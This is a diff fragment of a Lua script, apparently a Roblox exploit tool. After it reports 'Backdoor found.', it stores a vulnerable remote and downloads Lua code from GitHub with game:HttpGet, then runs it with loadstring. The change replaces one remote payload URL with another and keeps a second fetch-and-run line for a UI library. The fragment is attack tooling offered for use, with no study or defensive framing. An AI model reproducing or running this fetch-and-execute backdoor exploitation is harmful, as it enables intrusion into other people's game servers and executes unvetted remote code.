@@ -221,7 +221,7 @@ local script = G2L["7"];
 			stuff.tbtext.Text = "Backdoor found."
 			
 			shared.vulnremote = stuff.vulnremote
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/wh.lua"))()
+			loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Im-engaged-in-spizding-/raw/main/wh-spizdil.lua"))()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/rayfielduiharked.lua"))()
 			task.wait(5)
 			stuff.mgui:Destroy()
